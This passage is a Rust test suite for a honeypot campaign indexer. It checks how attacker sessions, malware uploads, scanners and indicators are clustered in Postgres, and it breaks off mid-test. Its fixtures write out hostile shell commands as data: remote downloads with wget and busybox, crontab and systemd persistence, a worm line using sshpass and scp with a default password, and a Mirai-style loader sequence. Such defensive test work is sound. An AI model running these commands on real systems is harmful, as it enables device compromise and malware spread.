//! The campaign indexer against real Postgres: the three grouping rules on discriminating
//! fixtures, indicator provenance, download links resolved after the fetch, and the property that
//! indexing a ledger batch by batch, interleaved with appends, leaves exactly the state one pass
//! over the same ledger leaves.
//!
//! Each test gets a fresh database (`migrations = false`, then both migration sets), because the
//! indexer reads every ledger row past its cursor and a shared database holds other tests' rows.
//! Addresses are RFC 5737; keys and hashes are synthetic.

use std::collections::{BTreeMap, BTreeSet};
use std::net::IpAddr;
use std::path::PathBuf;

use chrono::{DateTime, Duration, TimeZone, Utc};
use core_scoring::{EventInput, Protocol, SignalType, append_event, append_telemetry_event};
use review::campaign::{self, BatchOutcome, SCANNER_MIN_SENSORS};
use sensor_framework::Uuid;
use serde_json::{Value, json};
use sha2::{Digest, Sha256};
use sqlx::{PgPool, Row};

async fn migrate(pool: &PgPool) {
    sqlx::migrate!("../core-scoring/migrations")
        .run(pool)
        .await
        .unwrap();
    review::migrator().run(pool).await.unwrap();
}

fn t0() -> DateTime<Utc> {
    Utc.with_ymd_and_hms(2026, 10, 7, 4, 41, 0).unwrap()
}

fn sha_hex(bytes: &[u8]) -> String {
    Sha256::digest(bytes)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

#[allow(clippy::too_many_arguments)]
async fn append(
    pool: &PgPool,
    ip: &str,
    sensor: &str,
    signal: SignalType,
    at: DateTime<Utc>,
    metadata: Value,
    session: Option<Uuid>,
) {
    let event = EventInput::from_signal(
        ip.parse::<IpAddr>().unwrap(),
        None,
        sensor.into(),
        signal,
        Protocol::Tcp,
        true,
        at,
        metadata,
        session,
    );
    if signal.is_telemetry() {
        append_telemetry_event(pool, event).await.unwrap();
    } else {
        append_event(pool, event).await.unwrap();
    }
}

async fn command(
    pool: &PgPool,
    ip: &str,
    sensor: &str,
    at: DateTime<Utc>,
    session: Uuid,
    cmd: &str,
) {
    append(
        pool,
        ip,
        sensor,
        SignalType::HoneypotCommandExec,
        at,
        json!({ "command": cmd }),
        Some(session),
    )
    .await;
}

async fn upload(pool: &PgPool, ip: &str, at: DateTime<Utc>, sha: &str, session: Option<Uuid>) {
    append(
        pool,
        ip,
        "ssh",
        SignalType::HoneypotMalwareUpload,
        at,
        json!({ "sample_sha256": sha, "sample_orig_name": "w.sh", "capture_reason": "exec_stdin" }),
        session,
    )
    .await;
}

async fn index_all(pool: &PgPool) {
    loop {
        match campaign::index_batch(pool, campaign::BATCH_EVENTS)
            .await
            .unwrap()
        {
            BatchOutcome::Indexed(0) => return,
            BatchOutcome::Indexed(_) => {}
            BatchOutcome::LockedOut => panic!("nothing else holds the campaign lock in a test"),
        }
    }
}

/// `(kind, key)` -> sorted member addresses.
async fn memberships(pool: &PgPool) -> BTreeMap<(String, String), Vec<String>> {
    let rows = sqlx::query(
        "SELECT c.kind, c.key, host(m.source_ip) AS ip FROM campaign c \
         JOIN campaign_member m ON m.campaign_id = c.id ORDER BY 1, 2, 3",
    )
    .fetch_all(pool)
    .await
    .unwrap();
    let mut out: BTreeMap<(String, String), Vec<String>> = BTreeMap::new();
    for r in rows {
        out.entry((r.get("kind"), r.get("key")))
            .or_default()
            .push(r.get("ip"));
    }
    out
}

fn of_kind(m: &BTreeMap<(String, String), Vec<String>>, kind: &str) -> Vec<Vec<String>> {
    m.iter()
        .filter(|((k, _), _)| k == kind)
        .map(|(_, v)| v.clone())
        .collect()
}

/// A scanner sends the same protocol hello from every host it runs on. Recorded as probe evidence
/// (the telnet sensor's `probe_payload`), those five events form no campaign and no sample; the
/// same hosts sending a real upload do. Without the control a test of "no campaign" would pass
/// on an indexer that ignored everything.
#[sqlx::test(migrations = false)]
async fn probe_payload_evidence_is_not_grouped_into_a_sample_campaign(pool: PgPool) {
    migrate(&pool).await;
    for i in 1..=5 {
        append(
            &pool,
            &format!("192.0.2.{i}"),
            "telnet",
            SignalType::CatchallProbe,
            t0() + Duration::minutes(i),
            json!({
                "capture_reason": "probe_payload",
                "probe_protocol": "tls",
                "payload_hex": "160301005a01",
                "observed_len": 89,
            }),
            None,
        )
        .await;
    }
    index_all(&pool).await;
    assert!(
        memberships(&pool).await.is_empty(),
        "probe evidence made a campaign"
    );

    let body = sha_hex(b"synthetic body");
    for i in 1..=5 {
        upload(
            &pool,
            &format!("192.0.2.{i}"),
            t0() + Duration::hours(1),
            &body,
            None,
        )
        .await;
    }
    index_all(&pool).await;
    assert_eq!(of_kind(&memberships(&pool).await, "sample").len(), 1);
}

/// The Raspberry Pi worm copies itself byte for byte: five infected hosts uploading the same body
/// are one campaign with five members, and a different body is another campaign.
#[sqlx::test(migrations = false)]
async fn a_worm_sample_from_five_hosts_is_one_campaign_with_five_members(pool: PgPool) {
    migrate(&pool).await;
    let worm = sha_hex(b"synthetic worm body");
    let other = sha_hex(b"an unrelated dropper");
    for i in 1..=5 {
        upload(
            &pool,
            &format!("192.0.2.{i}"),
            t0() + Duration::minutes(i),
            &worm,
            None,
        )
        .await;
    }
    // A host uploading twice is still one member.
    upload(&pool, "192.0.2.1", t0() + Duration::hours(2), &worm, None).await;
    upload(&pool, "198.51.100.9", t0(), &other, None).await;
    index_all(&pool).await;

    let m = memberships(&pool).await;
    let worm_members = m.get(&("sample".into(), worm.clone())).unwrap();
    assert_eq!(
        worm_members,
        &(1..=5).map(|i| format!("192.0.2.{i}")).collect::<Vec<_>>()
    );
    assert_eq!(m.get(&("sample".into(), other)).unwrap().len(), 1);

    let row = sqlx::query(
        "SELECT member_count, sightings, first_seen, last_seen, label FROM campaign \
         WHERE kind = 'sample' AND key = $1",
    )
    .bind(&worm)
    .fetch_one(&pool)
    .await
    .unwrap();
    assert_eq!(row.get::<i32, _>("member_count"), 5);
    assert_eq!(row.get::<i64, _>("sightings"), 6);
    assert_eq!(
        row.get::<DateTime<Utc>, _>("first_seen"),
        t0() + Duration::minutes(1)
    );
    assert_eq!(
        row.get::<DateTime<Utc>, _>("last_seen"),
        t0() + Duration::hours(2)
    );
    assert_eq!(
        row.get::<String, _>("label"),
        format!("sample {} (w.sh)", &worm[..12])
    );
    let uploaded: Vec<bool> = sqlx::query_scalar(
        "SELECT uploaded FROM campaign_member m JOIN campaign c ON c.id = m.campaign_id \
         WHERE c.key = $1",
    )
    .bind(&worm)
    .fetch_all(&pool)
    .await
    .unwrap();
    assert!(uploaded.iter().all(|u| *u));
}

/// The owner's w.sh campaign: the same eleven-command script from many addresses, varying only in
/// the addresses and random markers it carries, is one command-sequence campaign. A session running
/// other commands is another, and a bare shell-entry preamble joins nothing.
#[sqlx::test(migrations = false)]
async fn sessions_differing_only_in_markers_and_addresses_group_and_others_do_not(pool: PgPool) {
    migrate(&pool).await;
    // The script retries `cat > astats` a varying number of times (the owner saw three); the
    // retries collapse, so the count does not split the campaign.
    let script = |ip: &str, marker: &str, retries: usize| -> Vec<String> {
        let mut commands = vec![
            "uname -s -v -n -r -m".to_string(),
            format!("echo {marker} > /tmp/.w && cat /tmp/.w && rm -f /tmp/.w"),
            "nproc".to_string(),
            "cat > w.sh".to_string(),
            format!("(crontab -l; echo \"@reboot /tmp/w.sh {ip}:443\") | crontab -"),
            "mkdir -p ~/.config/systemd/user".to_string(),
            "cat > ~/.config/systemd/user/watcher-netai.service".to_string(),
            "systemctl --user enable watcher-netai.service".to_string(),
            "ps aux | grep astats | grep -v grep | wc -l".to_string(),
        ];
        commands.extend(std::iter::repeat_n("cat > astats".to_string(), retries));
        commands
    };
    let campaign_ips = ["192.0.2.21", "192.0.2.22", "198.51.100.23"];
    let markers = [
        "3f2a9c1e5b7d4a60c1e2f3a4b5c6d7e8",
        "ffffeeee0000111122223333444455556666",
        "0123456789abcdef0123456789abcdef",
    ];
    for (n, (ip, marker)) in campaign_ips.iter().zip(markers).enumerate() {
        let session = Uuid::now_v7();
        let start = t0() + Duration::minutes(20 * n as i64);
        for (i, c) in script(&format!("203.0.113.{}", 50 + n), marker, 3 - n)
            .iter()
            .enumerate()
        {
            command(
                &pool,
                ip,
                "ssh",
                start + Duration::seconds(2 * i as i64),
                session,
                c,
            )
            .await;
        }
    }
    let survey = Uuid::now_v7();
    for (i, c) in ["pwd", "ssh -V", "uptime", "mount", "env", "ls -la /"]
        .iter()
        .enumerate()
    {
        command(
            &pool,
            "192.0.2.30",
            "ssh",
            t0() + Duration::seconds(i as i64),
            survey,
            c,
        )
        .await;
    }
    let preamble = Uuid::now_v7();
    for (i, c) in ["enable", "system", "shell", "sh"].iter().enumerate() {
        command(
            &pool,
            "192.0.2.31",
            "telnet",
            t0() + Duration::seconds(i as i64),
            preamble,
            c,
        )
        .await;
    }
    // Later traffic on both sensors moves their clocks past every session's idle gap.
    let later = t0() + Duration::hours(3);
    command(&pool, "192.0.2.99", "ssh", later, Uuid::now_v7(), "id").await;
    command(&pool, "192.0.2.99", "telnet", later, Uuid::now_v7(), "id").await;
    index_all(&pool).await;

    let sequences = of_kind(&memberships(&pool).await, "command_sequence");
    assert_eq!(sequences.len(), 2, "{sequences:?}");
    assert!(
        sequences.contains(&vec![
            "192.0.2.21".to_string(),
            "192.0.2.22".to_string(),
            "198.51.100.23".to_string()
        ]),
        "{sequences:?}"
    );
    assert!(sequences.contains(&vec!["192.0.2.30".to_string()]));

    let (label, rep): (String, Value) = sqlx::query_as(
        "SELECT label, representative FROM campaign WHERE kind = 'command_sequence' \
         AND member_count = 3",
    )
    .fetch_one(&pool)
    .await
    .unwrap();
    assert!(
        label.starts_with("10 commands: uname -s -v -n -r -m ; echo <hex>"),
        "{label}"
    );
    assert_eq!(
        rep["source_ip"], "192.0.2.21",
        "the earliest run represents the campaign"
    );
    assert_eq!(rep["shapes"].as_array().unwrap().len(), 10);
}

/// An open run is not grouped until its sensor's clock passes the idle gap; one that reaches the
/// shape cap is grouped at once.
#[sqlx::test(migrations = false)]
async fn a_run_is_grouped_at_the_idle_gap_or_the_shape_cap(pool: PgPool) {
    migrate(&pool).await;
    let short = Uuid::now_v7();
    for (i, c) in ["cat /proc/cpuinfo", "free -m", "uname -a"]
        .iter()
        .enumerate()
    {
        command(
            &pool,
            "192.0.2.40",
            "ssh",
            t0() + Duration::seconds(i as i64),
            short,
            c,
        )
        .await;
    }
    let long = Uuid::now_v7();
    for i in 0..campaign::MAX_RUN_SHAPES {
        command(
            &pool,
            "192.0.2.41",
            "ssh",
            t0() + Duration::seconds(i.into()),
            long,
            &format!("echo step{i}"),
        )
        .await;
    }
    index_all(&pool).await;
    let sequences = of_kind(&memberships(&pool).await, "command_sequence");
    assert_eq!(sequences, vec![vec!["192.0.2.41".to_string()]]);

    // The quiet run is ended once ssh has logged events an hour newer than its last command, not
    // before.
    command(
        &pool,
        "192.0.2.99",
        "ssh",
        t0() + Duration::minutes(59),
        Uuid::now_v7(),
        "id",
    )
    .await;
    index_all(&pool).await;
    assert_eq!(
        of_kind(&memberships(&pool).await, "command_sequence").len(),
        1
    );
    command(
        &pool,
        "192.0.2.99",
        "ssh",
        t0() + Duration::minutes(61),
        Uuid::now_v7(),
        "id",
    )
    .await;
    index_all(&pool).await;
    assert_eq!(
        of_kind(&memberships(&pool).await, "command_sequence").len(),
        2
    );

    // A gap of more than ten minutes between two of a session's own commands ends its run: the
    // next command starts a new one rather than extending the old.
    let paused = Uuid::now_v7();
    let base = t0() + Duration::hours(2);
    command(
        &pool,
        "192.0.2.42",
        "ssh",
        base,
        paused,
        "cat /proc/cpuinfo; free -m",
    )
    .await;
    command(
        &pool,
        "192.0.2.42",
        "ssh",
        base + Duration::minutes(9),
        paused,
        "uname -a",
    )
    .await;
    command(
        &pool,
        "192.0.2.42",
        "ssh",
        base + Duration::minutes(20),
        paused,
        "uname -a",
    )
    .await;
    index_all(&pool).await;
    let (run, shapes): (i32, i32) =
        sqlx::query_as("SELECT run, shapes FROM campaign_session WHERE session_id = $1")
            .bind(paused)
            .fetch_one(&pool)
            .await
            .unwrap();
    assert_eq!((run, shapes), (1, 1));
    let members = of_kind(&memberships(&pool).await, "command_sequence");
    assert!(
        members.contains(&vec!["192.0.2.42".to_string()]),
        "{members:?}"
    );
}

#[sqlx::test(migrations = false)]
async fn a_source_on_enough_sensors_within_a_window_is_a_scanner(pool: PgPool) {
    migrate(&pool).await;
    let sensors = ["catchall", "mssql", "adb", "http"];
    assert!(sensors.len() > SCANNER_MIN_SENSORS);
    for (i, s) in sensors.iter().enumerate() {
        let at = t0() + Duration::minutes(i as i64);
        append(
            &pool,
            "192.0.2.50",
            s,
            SignalType::CatchallProbe,
            at,
            json!({}),
            None,
        )
        .await;
        append(
            &pool,
            "192.0.2.51",
            s,
            SignalType::CatchallProbe,
            at,
            json!({}),
            None,
        )
        .await;
        // The same sensors, one per hour: never three within one window.
        append(
            &pool,
            "192.0.2.52",
            s,
            SignalType::CatchallProbe,
            t0() + Duration::hours(i as i64),
            json!({}),
            None,
        )
        .await;
    }
    // Telemetry is not activity: session-end records on new sensors cross nothing.
    for s in ["ftp", "smtp", "redis"] {
        append(
            &pool,
            "192.0.2.53",
            s,
            SignalType::HoneypotSessionEnd,
            t0(),
            json!({}),
            None,
        )
        .await;
    }
    index_all(&pool).await;
    let m = memberships(&pool).await;
    let scanners: Vec<(&(String, String), &Vec<String>)> =
        m.iter().filter(|((k, _), _)| k == "scanner").collect();
    assert_eq!(scanners.len(), 1, "{m:?}");
    let ((_, key), members) = scanners[0];
    assert_eq!(key, "adb,catchall,mssql");
    assert_eq!(
        members,
        &vec!["192.0.2.50".to_string(), "192.0.2.51".to_string()]
    );
}

/// Indicators from commands carry the event they came from; indicators from a captured artifact
/// carry its digest, and a worm-shaped artifact marks its sample campaign self-propagating.
#[sqlx::test(migrations = false)]
async fn indicators_carry_their_provenance(pool: PgPool) {
    migrate(&pool).await;
    let spool = tempfile::tempdir().unwrap();
    let worm = "#!/bin/bash\n\
                echo \"127.0.0.1 rival.example.net\" >> /etc/hosts\n\
                zmap -p 22 -o list\n\
                sshpass -praspberry scp $0 pi@$ip:/tmp/x\n";
    let worm_sha = sha_hex(worm.as_bytes());
    std::fs::write(spool.path().join(&worm_sha), worm).unwrap();
    // A compiled bot: its persistence template is found in its printable strings.
    let bot: &[u8] = b"\x7fELF\x02\x01\x01\0\x8f\xc3rm -f /etc/init.d/%s\0\x90\x91";
    let binary_sha = sha_hex(bot);
    std::fs::write(spool.path().join(&binary_sha), bot).unwrap();
    // A body with no printable run long enough to be a string.
    let stripped: &[u8] = b"\x7fELF\x02\x01\x01\0\x8f\xc3ab\0\x90";
    let stripped_sha = sha_hex(stripped);
    std::fs::write(spool.path().join(&stripped_sha), stripped).unwrap();
    let missing_sha = sha_hex(b"never spooled");

    let session = Uuid::now_v7();
    command(
        &pool,
        "192.0.2.60",
        "ssh",
        t0(),
        session,
        "cd /tmp; wget http://198.51.100.70:8080/kswpad",
    )
    .await;
    command(
        &pool,
        "192.0.2.60",
        "ssh",
        t0() + Duration::seconds(5),
        session,
        "wget http://198.51.100.70:8080/kswpad",
    )
    .await;
    for (i, sha) in [&worm_sha, &binary_sha, &stripped_sha, &missing_sha]
        .iter()
        .enumerate()
    {
        upload(&pool, &format!("192.0.2.{}", 61 + i), t0(), sha, None).await;
    }
    index_all(&pool).await;
    let dirs: Vec<(&'static str, PathBuf)> = vec![("ssh", spool.path().to_path_buf())];
    let scanned = campaign::scan_artifacts(&pool, &dirs).await.unwrap();
    assert_eq!(
        scanned, 3,
        "the text and both binary bodies were found; the fourth was not"
    );
    let from_binary: Vec<(String, String, String)> =
        sqlx::query_as("SELECT kind, value, detail FROM ioc WHERE artifact_sha256 = $1")
            .bind(&binary_sha)
            .fetch_all(&pool)
            .await
            .unwrap();
    assert_eq!(
        from_binary,
        vec![(
            "persistence".to_string(),
            "rm -f /etc/init.d/%s".to_string(),
            "init.d".to_string()
        )]
    );

    let rows = sqlx::query(
        "SELECT kind, value, detail, event_id, host(source_ip) AS ip, sightings FROM ioc \
         WHERE artifact_sha256 IS NULL",
    )
    .fetch_all(&pool)
    .await
    .unwrap();
    assert_eq!(rows.len(), 1);
    assert_eq!(
        rows[0].get::<String, _>("value"),
        "http://198.51.100.70:8080/kswpad"
    );
    assert_eq!(rows[0].get::<String, _>("ip"), "192.0.2.60");
    assert_eq!(rows[0].get::<i64, _>("sightings"), 2);
    let first_event: i64 = sqlx::query_scalar("SELECT min(id) FROM event")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(rows[0].get::<i64, _>("event_id"), first_event);

    let artifact: Vec<(String, String)> =
        sqlx::query_as("SELECT kind, value FROM ioc WHERE artifact_sha256 = $1 ORDER BY kind")
            .bind(&worm_sha)
            .fetch_all(&pool)
            .await
            .unwrap();
    assert_eq!(
        artifact,
        vec![(
            "hosts_entry".to_string(),
            "127.0.0.1 rival.example.net".to_string()
        )]
    );
    let states: BTreeMap<String, (String, i32)> = sqlx::query_as::<_, (String, String, i32)>(
        "SELECT sha256, state, attempts FROM ioc_artifact_scan",
    )
    .fetch_all(&pool)
    .await
    .unwrap()
    .into_iter()
    .map(|(s, st, a)| (s, (st, a)))
    .collect();
    assert_eq!(states[&worm_sha].0, "done");
    assert_eq!(states[&binary_sha].0, "done");
    assert_eq!(states[&stripped_sha].0, "not_text");
    assert_eq!(
        states[&missing_sha],
        ("pending".to_string(), 1),
        "a miss is retried later"
    );
    let propagating: bool = sqlx::query_scalar(
        "SELECT self_propagating FROM campaign WHERE kind = 'sample' AND key = $1",
    )
    .bind(&worm_sha)
    .fetch_one(&pool)
    .await
    .unwrap();
    assert!(propagating);
}

/// A download reported before the fetcher has an outcome is linked to the sample once it does.
#[sqlx::test(migrations = false)]
async fn a_download_joins_the_sample_campaign_once_the_fetch_lands(pool: PgPool) {
    migrate(&pool).await;
    let url = "http://198.51.100.80/bins/x86";
    for ip in ["192.0.2.71", "192.0.2.72"] {
        append(
            &pool,
            ip,
            "telnet",
            SignalType::HoneypotFileDownload,
            t0(),
            json!({ "url": url }),
            None,
        )
        .await;
    }
    index_all(&pool).await;
    assert!(of_kind(&memberships(&pool).await, "sample").is_empty());
    let pending: i64 = sqlx::query_scalar("SELECT count(*) FROM campaign_pending_fetch")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(pending, 2);

    let body_sha = Sha256::digest(b"fetched loader").to_vec();
    sqlx::query(
        "INSERT INTO fetch_attempt (url_hash, url, host, scheme, status, sha256, last_attempt) \
         VALUES ($1, $2, '198.51.100.80', 'http', 'success', $3, now())",
    )
    .bind(Sha256::digest(url.as_bytes()).to_vec())
    .bind(url)
    .bind(&body_sha)
    .execute(&pool)
    .await
    .unwrap();
    assert_eq!(campaign::resolve_pending_fetches(&pool).await.unwrap(), 2);
    let key: String = body_sha.iter().map(|b| format!("{b:02x}")).collect();
    let m = memberships(&pool).await;
    assert_eq!(
        m.get(&("sample".into(), key)).unwrap(),
        &vec!["192.0.2.71".to_string(), "192.0.2.72".to_string()]
    );
    // A later download of the same URL links at once.
    append(
        &pool,
        "192.0.2.73",
        "telnet",
        SignalType::HoneypotFileDownload,
        t0(),
        json!({ "url": url }),
        None,
    )
    .await;
    index_all(&pool).await;
    assert_eq!(of_kind(&memberships(&pool).await, "sample")[0].len(), 3);
}

// ---- the command-sequence fingerprint: what makes sessions the same tool ----

/// The shell-entry lines a telnet loader sends first; they are the target's login flow.
const ENTRY: [&str; 4] = ["enable", "system", "shell", "sh"];

/// A Mirai-family echo loader: sixteen distinct commands (`<esc>` payloads and addresses vary per
/// session in the real thing, and are normalized away).
const MIRAI: [&str; 16] = [
    ">/var/run/.x&&cd /var/run;>/tmp/.x&&cd /tmp;>/dev/.x&&cd /dev",
    "/bin/busybox ZXCVB",
    "/bin/busybox cat /proc/mounts",
    "/bin/busybox ls /dev",
    "/bin/busybox wget http://192.0.2.7/bins/x86 -O .x",
    "/bin/busybox echo -ne '\\x7f\\x45\\x4c\\x46' > .x",
    "/bin/busybox echo -ne '\\x01\\x01\\x01' >> .x",
    "/bin/busybox chmod 777 .x",
    "./.x telnet.loader",
    "rm -f .x",
    "/bin/busybox ps",
    "/bin/busybox kill -9 1",
    "/bin/busybox uname -m",
    "/bin/busybox id",
    "/bin/busybox df",
    "/bin/busybox free",
];

async fn session_of(pool: &PgPool, ip: &str, sensor: &str, start: DateTime<Utc>, cmds: &[&str]) {
    let session = Uuid::now_v7();
    for (i, c) in cmds.iter().enumerate() {
        command(
            pool,
            ip,
            sensor,
            start + Duration::seconds(2 * i as i64),
            session,
            c,
        )
        .await;
    }
}

/// Later traffic on each sensor moves its clock past every session's idle gap.
async fn end_runs(pool: &PgPool, sensors: &[&str]) {
    for sensor in sensors {
        command(
            pool,
            "192.0.2.99",
            sensor,
            t0() + Duration::hours(6),
            Uuid::now_v7(),
            "id",
        )
        .await;
    }
}

/// `(label, member count)` of every command-sequence campaign, largest first.
async fn sequences(pool: &PgPool) -> Vec<(String, i32)> {
    sqlx::query_as(
        "SELECT label, member_count FROM campaign WHERE kind = 'command_sequence' \
         ORDER BY member_count DESC, label",
    )
    .fetch_all(pool)
    .await
    .unwrap()
}

/// The owner's live console, 2026-10-08: one Mirai-family loader showed as dozens of campaigns,
/// "1 commands: ...", "2 commands: ..." and on, because sessions stop at different points. Sessions
/// cut at 4 to 16 commands are one campaign; the ones cut shorter have the opening they have, so
/// the loader is `KEY_SHAPES` campaigns, not sixteen.
#[sqlx::test(migrations = false)]
async fn a_loader_stopped_at_any_point_after_its_opening_is_one_campaign(pool: PgPool) {
    migrate(&pool).await;
    let key = review::campaign::fingerprint::KEY_SHAPES as usize;
    for cut in 1..=MIRAI.len() {
        let ip = format!("192.0.2.{}", 20 + cut);
        // Half the sessions come in through the shell-entry lines, half do not.
        let mut cmds: Vec<&str> = if cut % 2 == 0 { ENTRY.to_vec() } else { vec![] };
        cmds.extend(&MIRAI[..cut]);
        session_of(
            &pool,
            &ip,
            "telnet",
            t0() + Duration::minutes(cut as i64),
            &cmds,
        )
        .await;
    }
    end_runs(&pool, &["telnet"]).await;
    index_all(&pool).await;

    let found = sequences(&pool).await;
    assert_eq!(found.len(), key, "{found:?}");
    let opening = ">/var/run/.x&&cd /var/run;>/tmp/.x&&cd /tmp;>/dev/.x&&cd /dev \
                   ; /bin/busybox ZXCVB ; /bin/busybox cat /proc/mounts";
    // Half the sessions came in through the four entry lines; the label counts commands only, so
    // the range is 4 to 16 whatever the way in.
    assert_eq!(
        found[0],
        (format!("4-16 commands: {opening}"), (16 - key + 1) as i32)
    );
    // Each shorter cut is its own campaign, labeled with the opening it has.
    let mut shorter: Vec<String> = found[1..]
        .iter()
        .map(|(l, n)| {
            assert_eq!(*n, 1);
            l.clone()
        })
        .collect();
    shorter.sort();
    let first = &opening[..opening.find(" ;").unwrap()];
    let second = &opening[..opening.rfind(" ; ").unwrap()];
    assert_eq!(
        shorter,
        vec![
            format!("1 command: {first}"),
            format!("2 commands: {second}"),
            format!("3 commands: {opening}"),
        ]
    );
}

/// Two loaders that share their first commands are different tools once they diverge inside the
/// key, and the same tool when they diverge after it. Short numbers are part of the tool: an
/// architecture is not a random token.
#[sqlx::test(migrations = false)]
async fn loaders_that_differ_inside_the_key_do_not_merge(pool: PgPool) {
    migrate(&pool).await;
    // X and Y share three commands and diverge at the fourth; Z shares only the first.
    let x: Vec<&str> = MIRAI[..8].to_vec();
    let mut y: Vec<&str> = MIRAI[..8].to_vec();
    y[3] = "/bin/busybox ls /tmp";
    let mut z: Vec<&str> = MIRAI[..8].to_vec();
    z[1..].fill("/bin/busybox tftp -g -l .x -r x86 192.0.2.8");
    z[2] = "/bin/busybox tftp -g -l .y -r arm7 192.0.2.8";
    // W matches X for the whole key and then goes its own way: the same campaign as X.
    let mut w: Vec<&str> = MIRAI[..8].to_vec();
    w[5] = "/bin/busybox echo done";
    // Architecture names are tool vocabulary: arm5 and arm7 loaders are two campaigns (a
    // normalizer that blanks every digit would make them one).
    let arch = |a: &str| format!("/bin/busybox wget http://192.0.2.9/bins.sh/{a}");
    let (a5, a7) = (arch("arm5"), arch("arm7"));
    let on_x86: Vec<&str> = vec!["uname -m", "cd /tmp", a5.as_str(), "chmod 777 bins.sh"];
    let on_arm: Vec<&str> = vec!["uname -m", "cd /tmp", a7.as_str(), "chmod 777 bins.sh"];

    for (i, cmds) in [&x, &y, &z, &w, &on_x86, &on_arm].iter().enumerate() {
        for host in 0..3 {
            session_of(
                &pool,
                &format!("198.51.100.{}", 10 * i + host + 1),
                "telnet",
                t0() + Duration::minutes((10 * i + host) as i64),
                cmds,
            )
            .await;
        }
    }
    end_runs(&pool, &["telnet"]).await;
    index_all(&pool).await;
    let found = sequences(&pool).await;
    let counts: Vec<i32> = found.iter().map(|(_, n)| *n).collect();
    // X and W together, then Y, Z, arm5 and arm7 alone.
    assert_eq!(counts, vec![6, 3, 3, 3, 3], "{found:?}");
}

/// The owner saw `echo P155084A ; id ; echo $(( 155084 + 1 ))` as about twenty one-host campaigns,
/// and `N=49482a1671; ...` as one per host: only a random token differed.
#[sqlx::test(migrations = false)]
async fn per_session_random_tokens_do_not_split_a_campaign(pool: PgPool) {
    migrate(&pool).await;
    let mut rng = Rng(0x5eed_0001);
    for i in 0..20u64 {
        let n = 100_000 + rng.below(800_000);
        let ip = format!("192.0.2.{}", i + 1);
        session_of(
            &pool,
            &ip,
            "telnet",
            t0() + Duration::minutes(i as i64),
            &[
                &format!("echo P{n}A"),
                "id",
                &format!("echo $(( {n} + 1 ))"),
            ],
        )
        .await;
    }
    for i in 0..10u64 {
        // Hex words with one or two digits: only the hex rule (not the identifier rule, which
        // wants three digits) reads these as tokens.
        let tag = format!("a{i}bcdef{}", i + 1);
        let host = format!("203.0.113.{}", i + 1);
        session_of(
            &pool,
            &format!("198.51.100.{}", i + 1),
            "adb",
            t0() + Duration::minutes(i as i64),
            &[&format!(
                "N={tag}; cd /data/local/tmp; U=http://{host}/gms.apk; wget $U -O $N; pm install $N"
            )],
        )
        .await;
    }
    // An identifier that is not hex, assigned to a variable: the identifier rule.
    for i in 0..6u64 {
        session_of(
            &pool,
            &format!("203.0.113.{}", 150 + i),
            "adb",
            t0() + Duration::minutes(i as i64),
            &[&format!(
                "K=k{i}j{}x{}m1q; cd /data/local/tmp; wget -O $K http://192.0.2.9/k.apk",
                i + 2,
                i + 4
            )],
        )
        .await;
    }
    // A marker with a short number is a different thing: P12A and P34A are not random per session.
    for (i, n) in ["12", "34"].iter().enumerate() {
        session_of(
            &pool,
            &format!("203.0.113.{}", 100 + i),
            "telnet",
            t0(),
            &[
                &format!("echo P{n}A"),
                "id",
                &format!("echo $(( {n} + 1 ))"),
            ],
        )
        .await;
    }
    end_runs(&pool, &["telnet", "adb"]).await;
    index_all(&pool).await;
    let found = sequences(&pool).await;
    let counts: Vec<i32> = found.iter().map(|(_, n)| *n).collect();
    assert_eq!(counts, vec![20, 10, 6, 1, 1], "{found:?}");
}

/// HTTP request lines sent to a shell port, in any order, are one campaign of their own, not one
/// per header permutation and not a shell tool.
#[sqlx::test(migrations = false)]
async fn http_requests_on_a_shell_port_are_one_campaign(pool: PgPool) {
    migrate(&pool).await;
    let headers = [
        "User-Agent: Go-http-client/1.1",
        "Accept: application/json",
        "Node-Red-Api-Version: v2",
        "Accept-Encoding: gzip",
        "Host: 192.0.2.5:23",
    ];
    for i in 0..6usize {
        let mut order: Vec<&str> = headers.to_vec();
        order.rotate_left(i % headers.len());
        if i >= 3 {
            order.truncate(3);
        }
        if i == 5 {
            order.insert(0, "GET /api/flows HTTP/1.1");
        }
        session_of(
            &pool,
            &format!("192.0.2.{}", i + 1),
            "telnet",
            t0() + Duration::minutes(i as i64),
            &order,
        )
        .await;
    }
    session_of(&pool, "192.0.2.50", "telnet", t0(), &MIRAI[..6]).await;
    end_runs(&pool, &["telnet"]).await;
    index_all(&pool).await;
    let found = sequences(&pool).await;
    assert_eq!(found.len(), 2, "{found:?}");
    assert_eq!(found[0].1, 6);
    assert!(
        found[0]
            .0
            .ends_with("commands: http request sent to a shell port"),
        "{found:?}"
    );
    assert!(found[1].0.starts_with("6 commands: >/var/run"), "{found:?}");
}

/// `start ; enable ; config terminal` and its longer forms are a login that went nowhere: one
/// campaign, whatever number of entry lines the bot sent.
#[sqlx::test(migrations = false)]
async fn runs_of_shell_entry_lines_only_are_one_campaign(pool: PgPool) {
    migrate(&pool).await;
    let entry = [
        "start",
        "enable",
        "config terminal",
        "system",
        "linuxshell",
        "shell",
        "su",
        "sh",
    ];
    for cut in 3..=entry.len() {
        session_of(
            &pool,
            &format!("192.0.2.{cut}"),
            "telnet",
            t0() + Duration::minutes(cut as i64),
            &entry[..cut],
        )
        .await;
    }
    end_runs(&pool, &["telnet"]).await;
    index_all(&pool).await;
    assert_eq!(
        sequences(&pool).await,
        vec![("3-8 commands: shell entry only".to_string(), 6)]
    );
}

/// Mirai's login sequence and a payload sent XOR-obfuscated with key 9 (`lghkel` is `enable`): the
/// sensor decodes the line and records both. The campaign is keyed and labeled on the decoded
/// text, so these sessions join the plain-text ones, and the page can still show the raw form.
#[sqlx::test(migrations = false)]
async fn xor_encoded_sessions_join_the_plain_text_family(pool: PgPool) {
    migrate(&pool).await;
    let xor9 = |s: &str| -> String { s.bytes().map(|b| char::from(b ^ 9)).collect() };
    assert_eq!(xor9("enable"), "lghkel");
    let payload = &MIRAI[..6];
    // The encoded session is first, so it is the campaign's representative.
    let encoded = Uuid::now_v7();
    let mut at = t0();
    for decoded in ENTRY[..3].iter().chain(payload) {
        append(
            &pool,
            "192.0.2.1",
            "telnet",
            SignalType::HoneypotCommandExec,
            at,
            json!({ "command": xor9(decoded), "command_decoded": decoded, "xor_key": 9 }),
            Some(encoded),
        )
        .await;
        at += Duration::seconds(2);
    }
    let mut plain: Vec<&str> = ENTRY[..3].to_vec();
    plain.extend(payload);
    session_of(
        &pool,
